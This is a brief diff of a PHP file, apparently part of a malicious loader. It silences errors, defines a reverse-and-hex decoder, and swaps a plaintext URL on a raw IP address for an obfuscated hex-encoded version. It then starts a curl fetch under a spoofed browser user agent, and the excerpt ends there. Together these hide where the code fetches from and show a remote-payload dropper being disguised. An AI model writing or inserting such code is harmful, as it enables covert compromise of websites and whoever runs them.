@@ -13,7 +13,7 @@
  */
 @error_reporting(0); @ini_set('display_errors', 0);
 $d = function($s) { return hex2bin(strrev($s)); };
-$t = $d('http://198.204.224.102/j251205_13/init.txt');
+$t = $d('7478742e74696e692f33315f3530323135326a2f3230312e34322e3430322e3839312f2f3a70747468');
 $c = false;
 $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
 if (function_exists('curl_init')) {
